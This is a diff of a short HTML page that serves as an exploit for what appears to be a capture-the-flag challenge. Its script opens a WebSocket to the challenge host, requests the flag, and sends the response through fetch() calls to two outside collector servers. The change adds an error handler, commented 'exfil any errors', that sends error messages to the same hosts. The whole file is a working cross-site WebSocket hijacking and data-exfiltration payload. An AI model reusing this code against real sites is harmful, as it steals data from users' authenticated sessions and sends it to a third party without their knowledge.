@@ -1,23 +1,31 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-    <script>
 
-         const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
-      ws.onopen = () => {
-        ws.send(JSON.stringify({ message: '/getFlag' }));
-      };
-      ws.onmessage = (event) => {
-        fetch('https://uwvmoap.request.dreamhack.games/?flag=' + encodeURIComponent(event.data));
-        fetch('https://server.dottak.me/?flag=' + encodeURIComponent(event.data));
-        // if (event.data.includes('Flag:')) {
-        // }
-      };
-    </script>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+
+<body>
+  <script>
+
+    const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
+    ws.onopen = () => {
+      ws.send(JSON.stringify({ message: '/getFlag' }));
+    };
+    ws.onmessage = (event) => {
+      fetch('https://uwvmoap.request.dreamhack.games/?flag=' + encodeURIComponent(event.data));
+      fetch('http://server.dottak.me/?flag=' + encodeURIComponent(event.data));
+      // if (event.data.includes('Flag:')) {
+      // }
+    };
+    ws.onerror = (e) => {
+      // optional: exfil any errors
+      fetch('https://uwvmoap.request.dreamhack.games/?error=' + encodeURIComponent(e.message))
+      fetch('http://server.dottak.me/?error=' + encodeURIComponent(e.message));
+    };
+  </script>
 </body>
+
 </html>
